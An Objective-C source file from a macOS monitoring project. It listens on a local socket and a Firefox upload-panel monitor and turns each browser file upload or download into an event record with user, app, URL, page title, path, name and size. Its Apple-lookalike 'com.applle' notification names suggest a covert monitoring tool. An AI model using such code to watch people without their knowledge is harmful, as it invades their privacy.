//
//  InternetFileUploadDownloadCapture.m
//  InternetFileTransferManager
//
//  Created by ophat on 9/16/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import "InternetFileUploadDownloadCapture.h"
#import "FirefoxUploadFilePanelMonitor.h"

#import "SystemUtilsImpl.h"
#import "DateTimeFormat.h"
#import "FxFileTransferEvent.h"
#import "DefStd.h"

const int kDownloadDirection = 0;
const int kUploadDirection   = 1;

@implementation InternetFileUploadDownloadCapture

@synthesize mQueue, mThread;
@synthesize mDelegate, mSelector;

- (id) init {
    self = [super init];
    if (self) {
        mQueue = [[NSOperationQueue alloc] init];
        mQueue.maxConcurrentOperationCount = 1;
        mPanelMonitor = [[FirefoxUploadFilePanelMonitor alloc] init];
    }
    return self;
}

#pragma mark - Start or Stop

-(void)startCapture {
    DLog(@"startCapture");
    if (mIFTSocketReader == nil) {
        mIFTSocketReader = [[SocketIPCReader alloc] initWithPortNumber:55502 andAddress:kLocalHostIP withSocketDelegate:self];
        [mIFTSocketReader start];
    }
    
    [mPanelMonitor startMonitor];
    
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(), CFSTR("com.applle.blblu.ift.enable"), (void *)self, nil, kCFNotificationDeliverImmediately);
}

-(void)stopCapture {
    DLog(@"stopCapture");
    if (mIFTSocketReader != nil) {
        [mIFTSocketReader release];
        mIFTSocketReader = nil;
    }
    
    [mPanelMonitor stopMonitor];
    
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(), CFSTR("com.applle.blblu.ift.disable"), (void *)self, nil, kCFNotificationDeliverImmediately);
}

#pragma mark - Socket

- (void) dataDidReceivedFromSocket: (NSData*) aRawData {
    if (aRawData) {
        [self.mQueue addOperation:[NSBlockOperation blockOperationWithBlock:^{
            [self receivedFileUploadDownloadData:aRawData];
        }]];
    }
}

#pragma mark - Private methods

- (void) receivedFileUploadDownloadData:(NSData *) aUDData {
    DLog(@"Did received file upload or download");
    if ([self.mDelegate respondsToSelector:self.mSelector]) {
        NSString * info = [[[NSString alloc] initWithData:aUDData encoding:NSUTF8StringEncoding] autorelease];
        if (info) {
            NSArray * spliter = [info componentsSeparatedByString:@"|"];
            int direction         = [[spliter objectAtIndex:0] intValue];
            NSString * cUser      = [spliter objectAtIndex:1];
            NSString * appID      = [spliter objectAtIndex:2];
            NSString * appName    = [spliter objectAtIndex:3];
            NSString * url        = [spliter objectAtIndex:4];
            NSString * title      = [spliter objectAtIndex:5];
            NSString * filename   = [spliter objectAtIndex:6];
            NSString * pathTofile = [spliter objectAtIndex:7];
            
            NSNumberFormatter *nf = [[[NSNumberFormatter alloc] init] autorelease];
            nf.numberStyle = NSNumberFormatterDecimalStyle;
            NSNumber *fileSize = [nf numberFromString:[spliter objectAtIndex:8]];
            
            DLog(@"============ receivedFileUploadDownloadData =============");
            DLog(@"Direction    :%d",direction);
            DLog(@"CurrentUser  :%@",cUser);
            DLog(@"AppID        :%@",appID);
            DLog(@"App          :%@",appName);
            DLog(@"URL          :%@",url);
            DLog(@"Title        :%@",title);
            DLog(@"Path         :%@",pathTofile);
            DLog(@"FileName     :%@",filename);
            DLog(@"FileSize     :%@",fileSize);
            DLog(@"===========================================================");
            
            FxFileTransferEvent *fileTransferEvent = [[FxFileTransferEvent alloc] init];
            [fileTransferEvent setDateTime:[DateTimeFormat phoenixDateTime]];
            [fileTransferEvent setMUserLogonName:cUser];
            [fileTransferEvent setMApplicationID:appID];
            [fileTransferEvent setMApplicationName:appName];
            [fileTransferEvent setMTitle:title];
            
            if ([url rangeOfString:@"http"].location != NSNotFound ||
                [url rangeOfString:@"https"].location != NSNotFound ) {
                [fileTransferEvent setMTransferType:kFileTransferTypeHTTP_HTTPS];
            }else{
                [fileTransferEvent setMTransferType:kFileTransferTypeUnknown];
            }
            
            if (direction == kUploadDirection) {
                [fileTransferEvent setMDirection:kEventDirectionOut];
                [fileTransferEvent setMSourcePath:[NSString stringWithFormat:@"%@/%@",pathTofile,filename]];
                [fileTransferEvent setMDestinationPath:url];
            }else if (direction == kDownloadDirection) {
                [fileTransferEvent setMDirection:kEventDirectionIn];
                [fileTransferEvent setMSourcePath:url];
                [fileTransferEvent setMDestinationPath:[NSString stringWithFormat:@"%@/%@",pathTofile,filename]];
            }
            
            [fileTransferEvent setMFileName:filename];
            [fileTransferEvent setMFileSize:(NSUInteger)fileSize.unsignedLongLongValue];
            
            [self.mDelegate performSelector:self.mSelector
                                   onThread:self.mThread
                                 withObject:fileTransferEvent
                              waitUntilDone:NO];
            
            [fileTransferEvent release];
        }
    }
}

#pragma mark - Destroy

- (void) dealloc {
    [self stopCapture];
    
    [mPanelMonitor release];
    [mQueue release];
    
    [super dealloc];
}
@end
